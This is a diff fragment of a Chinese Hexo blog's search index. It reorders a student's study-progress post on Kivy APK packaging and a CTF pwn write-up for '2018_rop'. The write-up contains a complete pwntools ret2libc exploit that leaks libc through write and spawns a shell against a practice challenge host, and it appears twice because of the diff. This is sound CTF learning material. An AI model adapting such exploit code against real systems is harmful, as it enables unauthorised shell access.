c0c3ded8c15e0f5506fb4ce6a97ac4472d6e22beb9903d9eb361a46a95837db070425ee591720892d85590779dad73fb1018107a3a7a15fb4543292da1107b52c37dbdc291c1490b8c71b25455410dc3820d39f6d0899a913826cb23eca4c4e306185f4fbc66ee169c7bde55cbb8149264dcaaa4720e94afb2b06ebfc2c17831449079c2bda7c1174070a6cd4466c10023ac872f0ab4cbe40d46e75f3a4a4206e80350cc46f10ee9902722a269774466b1aaddae9ee2a5a03bb09b506ebca26afddd3dd2b2778e0198233f87f14bbe96cd12abe7044f4135ee3eb630cb6cfd10912f6fdca0bf998593398a30dbaad2f9b7e478890a6ce45894600076b252f25eaa2b2ddfa5d37b9f0fdd9899335179f34d6ebb26eb8fccc90db1ba83a23ee4024868da32cafc665e4620aa3cb96a38cf5070dd15dee0189fd7fbaca76b0617ee88da9589fe92eb034b92b41d06ba4374f9af1a25b0adb7096099382a7bc579c0215a97fa42240f8849cfe593ff37d659adada2b44724eec1b2269b41714607401c906883b5b2b6ba9f049443a0ba7b91779e78dccdf582e3d121c4490f8c2b0bb8ebdc45813f6fc83c7ea4634ef390ef05fe95ece1c1de8978660a514581a88c843618b8149230b2953156c2ae8e72c532c399b84db2423e1bbad82c777bd66d0f2725890b5b32c13cb5130d46545e675fddc63f005fffb6c736a2eb89d7706526e5decaed13a1ad0aa1f396ea813bfb932dde87dffb73ac41275f6b0e111d8c3a0b2f4eece0b6a5073edddab2ed3cf2dad3f360ad1cc4e2a8e04bcc468fcaacc5e9189c2f3b88dfcec5aac30a63cf89a3d85d6120f2d2e2dc1e321a9cdacd69cba6a5f2cb89e59efd5f40538077d40efbac207346671ddb3b81942a863d7bd162ab8cf3d6202a08bd47a168952ce10719a68bcfea7df9b989550753d426ce655a5ce512b98a09d7105bacf1d2658895d6b00f7127b8963ec321583e4ef479d0dffbc6e9f79558bf74b92c7471780eee727b3375b787c52e762e6b33f253fd5982382157daef6e4f2009418beadfd6215d8d6fdbb5f3ad5e401ecba0ec6ae536850adac4c40c5e827c36f635feac943e9a74692b2e80817dcf4f535c3074381e2f384fbe58d05f02645552cb71f4ac8f092c414698031c33303b6924afa626746a5ebb6772929fd9f0a1cd6c2397562a190e0c8a00a16fa290c9cc7a02728bbb21916e830743cf32bc9b9b922b2fe228d6b6b9a2c16e6e2457111ba2ca353cc3438e717082029bb02bf5879f26022b8b6ab6575a36645d1f5e56f21b226003881b5392244511e744da1f187bdb5c6672a1577e818d987e7f2196012310a40faab4a4b00ee9410197a72cceb031192d4e64334f5d622add74692f610fda75db798e98b92a0a23b2e904b9719b3842467623848a9db996ba8698c420f827ae07d1201199baf44012ed4f93212df8a9b99bed8ab79836aa5d3754cc550ab261797ceb9803dabe1514ad62015c23675d2290f6807c512f37b18798970583b0d86d7a33e452a69fbe2397d5248acf2c6e7492310ded5589a0c28323d8228c7f16da83b12322c280a0a9c3e5db5c47c5221deace81e21e65de96ca766615650f18ba2d1ad649da18522007b3e5bee95508f5109df0adaf9e82b1ed81d35def07d28d169a5132183b67556a0c8b0af1e7c9cbeb27b4d45e7f924c5fdc71dd95164fda6a54a83ad575f4234789949a30fb978a02dc175954d6e07b9becb9d1f123a55e3371876734de6db670f5e32d4982cbfa5b0d33a90eec624614855890422c279c5726d2ad30b66fab5b8a4d9a33be5ef873f58b89bf4cf22f668b473b3cbff4dbcb9c204695a241b4c67c9e68a545fdfb87c0938ac79850bffa9fc3765cf3634c9628116ecebdcc297b050cdc9032082a595a20ebf024f6905d2e145108e3d85f091244a4825d94983bb93594b75ae235e19867a4c9f8b751bbc3e0eaabc99996b478603806afc4aa77268aefeeba80f1de024da1f7fc5bfd66d6edfac623f931afd0721899667dfdef6829b349835f05a6acbd4ec3cee290e8d7a5d8d1bdd05dc7d078886d89ec80ec2bb41d97252c4f965cb9c0cff4cad0c79f25c32fedcdb3b3f35205bbd8d5f3b26b438e80754593b511d146ec58ba24dafc28b16219c7aa0f8716f0054b6ae05a0f9fa7742738bb9692a69149d9b2450495e44efaebaf52ed1c637ce654a7233a6eca5286bf5988d6d5ff2bf962dd588a48651144939909b7cb153f2353f64290c4308793f8b474643bb3a6253b60139354dcddf5606fc0c9becb730341e48cb040d97ea4b4187881820fea49a429f67b4d860d0a529fad393e801b25b4b86848d93d5fc9281f349e12193ed8507a71150136442d815f30aef4d644dad32d9e33e02802d0d5b113d8f0fcc01645a0c523f4def20c65ed156c695a55a3c028311170c5d05799f5ec13c4fb0ad96e6831890bf60d8f9f496a17425b1017ffce295b990f3cd98a5489a4c9c0a99c1168cbed2cdb418fbe798edbc76008f9af138d7f8406d82832b1e275c438f4b6a854d7498f2a6e67df32e930274c3b72d2af5a22979ce49a9180a7ce99ab45e1100f7d9f6cfa7c56c1fb7a7e302cdb28169496fb7c0f8096c9ed55c07e7aea39afddd3fde6cae4798d76e43de2f9eaf45afc7d7b3fd3891eaf2a02dbf3783d3d2cc57ffbcc35d3f55aa4c43c23e3ea2dd14df7279a80a60d9266c21f49d0b3c02339a3a16f2c91d8a87c06c5f675049f6d4b374c0daf5f54d52a64ddcc4329761b84c9c40b5f3196ec38f23c143aa0f8b93c6359df69af5c325db787274d77f26db9ecee6f13870bb58a1bd3e0b7e5b4a1e9fb7c69d18ba062c511e56d6b90a6327b12d1a19eabb551667c64be1d7806288c40f68ad6a9a17f33c5e3e9f27d20fb2d5d70521120d6f4a79c9a75425e87c4d64e09f5920f2085017a2fd341578ce3d228a6f5ff271c793ea110815b1ca0bc1789582822eeba6530ec9b221d547af1c9ec2db826264c4acc5fb0e9dd2a5e4dcefe5f9b663ca209112c0c85242c989f5f5f5aee2d2380d0664692a027e6170116d0c8f4f8b2341ff5b0bfbc149e63cf6e9d99dbf5b7ce299ab600957603b13af30df691020ee3619c8e5b705a738f952734611d295941f9f1313e6e3275d151943a72ae6fc69dc2b08058aa8016fea8ad75e9c66841f50f4e06eec2514d958285f3e0f8ec6bd8f35fa511adf007e9551e8bf9de691e2fd1f43fd17bde44050c55a250d2ef761d49edc47d9e6f9f209f6f7d3e049217fd0df52caafa51541fa4de21d341b5082da94adf183fbed182bf11638aa8565a6a6161854a1154dc647c4d2c2ffa6d4ee0f78c43f5138c9afc9b8d5a3fc14a5d3370064e8f4bcc22162443f1c98002968975539d499299da40954b7c08c12cba9ce573a43f91f3db55c72289c561549420c534362b48a681e589a4a78e81f6a63018bc36bf78b01a115940cdbdd303cc38bd31401aac7f996f9c24d1aafad7c99d14dfbe60ef6c057dfebaa6420c7a76584d3dd72a94964a798f78d439b018cc7d94303db8f4226569ab51fd00164474c3c675a2693ea5a2762dccc9af9276986c8e0c807efeb115099a97e9a5c5fb06104f58d7afdb93437f1239dbc6f906add6926f733219ba90e6ac4c7712100a0984c57bf8c9e7fa2b8538ea49a261fb1b868123e459b3b6d17354300bb838c3d5791d324ad22979c632691fee5e833040245715955745438d5d5f4390c2ee9aa28ab60fb2bd4509f6afdd8a901eb2624fdf3a7a7093526774c8d04e1e4041a370d3343d444f1ea8e16195f93b303fd47a62180db27ce9cf6196bc0f639dabd9d93293bfd0ee3b57b3755553b0865b9d886b7cc889ada856c66545a2859f938bbcb894488e522899f0073ab0454b8951c08e191d6e8b2b2d5867e89a58dbddba103c23a7bcbf072d57d9e50549b2af3b4b738d3023428b5a5873083585492bd590cd511cf4c1bb6de97a42cfc5cd04fef8c1a82f04a12bfbe304f57b5f94bc07013e9a5033f49cc9b91b8c35f1a7de0a7ae3bc04fef24470aa4eb98d137e4d24ac03568d56c0e3f5c41cccf7a797e62d183e26e44cae335ed6ee454e1894e9a890343f0c9ef91e8adddfe25faf2907213af64e53baa51f08605a19de51be8b0d6e70c5bab4f5469a84ca847221072d3e7bc61eddf16ea8b0f7ae34933820f4c85e69dd346a207ec27fa80a9679a9fd558eb569f8910883e92812a1f9b673f276fac5df50075a019d99b419750f76109e2f3db003fa97bd8eb9b5cfff9df06f06d5c8db460a01498895da42f3935983e2db92f63afce0d1f5ccb04147c0fd40eec550518bbf0a6dc235f4da2046d0709efdcbb1f5cd0b78d803f4875ef0a14a718492be731bb108ae0b6579b41cd70298baa657e87a248def5c0e1915d241f3a2fe35028f28c2d4a1fcc1361d153c829c91066903e9075cfb5b7340088ac2b77ef8847d0d9d16526467ecbe12a962c19f9a039320afba25510a8425f6a20e27df5da28c7af99d3e2def5fc6a5069fa80eeb82b412431b9381283fdfefcd3c0538a559e349c4cee1bbf892d1741ef876dcfb15600fd107d3e120e68088e76c63dede4e199da9b50418569b60ca8afa0cd5520e66511e61068cbedfd495d5b318ac2ad06701390ac38156865796d0e5a8aca8dd7165de4b17db113f31d425e799b934819ac656123dc0e8a53765d93eb9e548ad06700254159eadf7c6256d85d231e2abe2aa2d6a663baf1f8e41236d24a36cab9242362220f2e8828ee6bc0712d7574ecf9c5e5f4d91080344fcad78596105dab983be5ac9844c2ea0857a7ac3ddef23ce2ad608fd873195d8a4a9d369e8ff3550ce0de518161d08f4e62a71da86b13553bbf235c92a266ddfbd749af3e9d81239c1230f8f6c63e4fd97ca5bd2b3d10f96edcd88f81521c53c84564666a0c0b304db3a090452ce995623b896968d3030d54c325ff70a2c469c61461031b53cb90a0995ea6d5e9e09273e813a74b00d248091855d14c03584c79022556a5b9f1c3cf0da0193f5324477bd970bf876e0c6c56bea71ce4f907edb74b6e862707edcf31ee0db53b4beabd7941b178b46790c14fc09fe64b2a77e685e8d3c5527448c89617d44d5e50f3e54d90b86bea45783b59cd4c32693ede25cef0f94ac60d420108dfa5b7c28dcadb2e87819ee842a5cb8e4b6278f728e326aced5ae7788e831c647cbe0357b4e36f9895ec21a7bca25fe5295bb3c379512</script>
-  <div class="hbe hbe-content">
-    <div class="hbe hbe-input hbe-input-default">
-      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
-      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
-        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
-      </label>
-    </div>
-  </div>
-</div>
-<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
+    <title>寒假学习(三)</title>
+    <url>/2022/02/06/%E5%AD%A6%E4%B9%A0%E8%BF%9B%E5%BA%A6%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%89%EF%BC%89%EF%BC%882022.1.31-2022.2.6%EF%BC%89/</url>
+    <content><![CDATA[<span id="more"></span>
+<h1 id="学习进度总结（三）（2022-1-31-2022-2-6）"><a href="#学习进度总结（三）（2022-1-31-2022-2-6）" class="headerlink" title="学习进度总结（三）（2022.1.31-2022.2.6）"></a>学习进度总结（三）（2022.1.31-2022.2.6）</h1><h2 id="作品赛ing"><a href="#作品赛ing" class="headerlink" title="作品赛ing"></a>作品赛ing</h2><p>新年快乐！初一、初二两天有事在成都待了两天，但是没有闲着，一直也在解决打包难的问题。在网上各种找资料，发现用kivy打包apk的事都好久远了，没多少人用，更别说有报错分析的。于是只好自己一步一步摸索，还好功夫不负有心人，初三回家之后基本上算是把buildozer打包问题搞明白了，主要注意<strong>buildozer.spec</strong>文件里面的几个部分必须修改对：</p>
+<ol>
+<li><p>文件名称</p>
+<p>很多时候打包不成功就是因为文件名称对不上main.py里面的函数名，后来每一次都改，也就没有在出过问题。</p>
+</li>
+<li><p>绝对路径</p>
+<p>在配置文件里，main.py的路径一定要填写正确</p>
+</li>
+<li><p>配置要求</p>
+<p>配置文件里面的<strong>requirements</strong>这一部分必须要填写完整，只要整个打包文件夹里包含到的需要使用的一些插件都需要写上，这样在打包时才会下载这些插件，最后打包出来才不会报错，也不会闪退</p>
+</li>
+<li><p>source.include_exts</p>
+<p>这一行内容默认的一般是py,png,jpg,kv,atlas，但是很多时候自己的文件内容可能不止这些文件类型包含，这时候也需要自行添加，否则打包后就会出现闪退现象，例如有ttf格式文件，就加上ttf</p>
+</li>
+<li><p>网络要求</p>
+<p><strong>android.permissions = INTERNET</strong>这一行也是必须打开的，默认前面有#号，是没有使用的，需要自己打开，不然打包好也是闪退</p>
+</li>
+</ol>
+<p>反正问题很多，这也只是我暂时总结出来的一些打包经验，如果后面打包途中再遇上什么问题，我再继续补充……</p>
+<p>然后打包之余也有在学习kivy的一些内容，我们现在的项目内容有一个最大的难点就是还没有关键技术，如果一直没有关键技术的话，基本上做出来也不会有多大的作用和效果，所以还得继续钻研，最晚五月份交作品，时间还是挺多的，四个人好好加油，相信一定能攻破难关！</p>
+<h2 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h2><p>寒假的时间确实大部分都在走亲访友中度过了，再加上作品赛一整，很是没有太多时间拿来学习ctf，hgame就打了第一周的，之后的每周有wp出来我也在看，还是觉得自己学的太浅了，pwn确实是任重道远，我现在的水平无法做到保证在正式比赛中有pwn方向的输出，但是我在尽力调整，争取在下学期国赛等大赛来临之前达到能保证输出的水平，为XJUSEC贡献一份力量！继续加油吧！</p>
+]]></content>
       <categories>
-        <category>日常闲话</category>
+        <category>2022</category>
       </categories>
       <tags>
         <tag>生活</tag>
@@ -1154,31 +1187,6 @@ callq 在栈里存放一个8位的返回地址
       </tags>
   </entry>
   <entry>
-    <title>铁人三项(第五赛区)_2018_rop</title>
-    <url>/2021/06/25/%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9-%E7%AC%AC%E4%BA%94%E8%B5%9B%E5%8C%BA-2018-rop/</url>
-    <content><![CDATA[<span id="more"></span>
-<h2 id="铁人三项-第五赛区-2018-rop"><a href="#铁人三项-第五赛区-2018-rop" class="headerlink" title="铁人三项(第五赛区)_2018_rop"></a>铁人三项(第五赛区)_2018_rop</h2><p>查看保护机制，开了NX，32位</p>
-<p><img src="/img/image-20210625101308461.png" alt="image-20210625101308461"></p>
-<p>IDA打开，shift+F12查找字符串，没有发现/bin/sh</p>
-<p><img src="/img/image-20210625101526643.png" alt="image-20210625101526643"></p>
-<p>再查看main函数中，东西不多，挨个查看里面的函数，发现vulnerable_function();函数里面有蹊跷</p>
-<p><img src="/img/image-20210625101817170.png" alt="image-20210625101817170"></p>
-<p>这里发现漏洞，read的buf长度为0x100，而写入的参数大小是0x88，能溢出0x78个长度，足够构造rop攻击 </p>
-<p><img src="/img/image-20210625101909489.png" alt="image-20210625101909489"></p>
-<h3 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h3><p>先通过write函数地址泄露出libc版本，然后再在libc版本里算出system函数和/bin/sh的地址，最后通过栈溢出覆盖返回地址填上system(‘/bin/sh’)，夺权。</p>
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28086</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./2018_rop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(write_plt)+p32(main)+p32(<span class="number">0</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">write_addr=u32(r.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">offset=write_addr-libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system_addr=offset+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh=offset+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(system_addr)+p32(<span class="number">0</span>)+p32(bin_sh)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>脚本一跑，cat flag就得到flag了</p>
-<p><img src="/img/image-20210625105710279.png" alt="image-20210625105710279"></p>
-]]></content>
-      <categories>
-        <category>writeup</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>pwnable_orw</title>
     <url>/2022/01/21/%E6%B2%99%E7%AE%B1%E5%88%9D%E4%BD%93%E9%AA%8C%EF%BC%88pwnable_orw)/</url>
     <content><![CDATA[<span id="more"></span>
@@ -1203,36 +1211,28 @@ callq 在栈里存放一个8位的返回地址
       </tags>
   </entry>
   <entry>
-    <title>寒假学习(三)</title>
-    <url>/2022/02/06/%E5%AD%A6%E4%B9%A0%E8%BF%9B%E5%BA%A6%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%89%EF%BC%89%EF%BC%882022.1.31-2022.2.6%EF%BC%89/</url>
+    <title>铁人三项(第五赛区)_2018_rop</title>
+    <url>/2021/06/25/%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9-%E7%AC%AC%E4%BA%94%E8%B5%9B%E5%8C%BA-2018-rop/</url>
     <content><![CDATA[<span id="more"></span>
-<h1 id="学习进度总结（三）（2022-1-31-2022-2-6）"><a href="#学习进度总结（三）（2022-1-31-2022-2-6）" class="headerlink" title="学习进度总结（三）（2022.1.31-2022.2.6）"></a>学习进度总结（三）（2022.1.31-2022.2.6）</h1><h2 id="作品赛ing"><a href="#作品赛ing" class="headerlink" title="作品赛ing"></a>作品赛ing</h2><p>新年快乐！初一、初二两天有事在成都待了两天，但是没有闲着，一直也在解决打包难的问题。在网上各种找资料，发现用kivy打包apk的事都好久远了，没多少人用，更别说有报错分析的。于是只好自己一步一步摸索，还好功夫不负有心人，初三回家之后基本上算是把buildozer打包问题搞明白了，主要注意<strong>buildozer.spec</strong>文件里面的几个部分必须修改对：</p>
-<ol>
-<li><p>文件名称</p>
-<p>很多时候打包不成功就是因为文件名称对不上main.py里面的函数名，后来每一次都改，也就没有在出过问题。</p>
-</li>
-<li><p>绝对路径</p>
-<p>在配置文件里，main.py的路径一定要填写正确</p>
-</li>
-<li><p>配置要求</p>
-<p>配置文件里面的<strong>requirements</strong>这一部分必须要填写完整，只要整个打包文件夹里包含到的需要使用的一些插件都需要写上，这样在打包时才会下载这些插件，最后打包出来才不会报错，也不会闪退</p>
-</li>
-<li><p>source.include_exts</p>
-<p>这一行内容默认的一般是py,png,jpg,kv,atlas，但是很多时候自己的文件内容可能不止这些文件类型包含，这时候也需要自行添加，否则打包后就会出现闪退现象，例如有ttf格式文件，就加上ttf</p>
-</li>
-<li><p>网络要求</p>
-<p><strong>android.permissions = INTERNET</strong>这一行也是必须打开的，默认前面有#号，是没有使用的，需要自己打开，不然打包好也是闪退</p>
-</li>
-</ol>
-<p>反正问题很多，这也只是我暂时总结出来的一些打包经验，如果后面打包途中再遇上什么问题，我再继续补充……</p>
-<p>然后打包之余也有在学习kivy的一些内容，我们现在的项目内容有一个最大的难点就是还没有关键技术，如果一直没有关键技术的话，基本上做出来也不会有多大的作用和效果，所以还得继续钻研，最晚五月份交作品，时间还是挺多的，四个人好好加油，相信一定能攻破难关！</p>
-<h2 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h2><p>寒假的时间确实大部分都在走亲访友中度过了，再加上作品赛一整，很是没有太多时间拿来学习ctf，hgame就打了第一周的，之后的每周有wp出来我也在看，还是觉得自己学的太浅了，pwn确实是任重道远，我现在的水平无法做到保证在正式比赛中有pwn方向的输出，但是我在尽力调整，争取在下学期国赛等大赛来临之前达到能保证输出的水平，为XJUSEC贡献一份力量！继续加油吧！</p>
+<h2 id="铁人三项-第五赛区-2018-rop"><a href="#铁人三项-第五赛区-2018-rop" class="headerlink" title="铁人三项(第五赛区)_2018_rop"></a>铁人三项(第五赛区)_2018_rop</h2><p>查看保护机制，开了NX，32位</p>
+<p><img src="/img/image-20210625101308461.png" alt="image-20210625101308461"></p>
+<p>IDA打开，shift+F12查找字符串，没有发现/bin/sh</p>
+<p><img src="/img/image-20210625101526643.png" alt="image-20210625101526643"></p>
+<p>再查看main函数中，东西不多，挨个查看里面的函数，发现vulnerable_function();函数里面有蹊跷</p>
+<p><img src="/img/image-20210625101817170.png" alt="image-20210625101817170"></p>
+<p>这里发现漏洞，read的buf长度为0x100，而写入的参数大小是0x88，能溢出0x78个长度，足够构造rop攻击 </p>
+<p><img src="/img/image-20210625101909489.png" alt="image-20210625101909489"></p>
+<h3 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h3><p>先通过write函数地址泄露出libc版本，然后再在libc版本里算出system函数和/bin/sh的地址，最后通过栈溢出覆盖返回地址填上system(‘/bin/sh’)，夺权。</p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28086</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./2018_rop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(write_plt)+p32(main)+p32(<span class="number">0</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">write_addr=u32(r.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">offset=write_addr-libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system_addr=offset+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh=offset+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(system_addr)+p32(<span class="number">0</span>)+p32(bin_sh)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>脚本一跑，cat flag就得到flag了</p>
+<p><img src="/img/image-20210625105710279.png" alt="image-20210625105710279"></p>
 ]]></content>
       <categories>
-        <category>2022</category>
+        <category>writeup</category>
       </categories>
       <tags>
-        <tag>生活</tag>
+        <tag>pwn</tag>
       </tags>
   </entry>
   <entry>
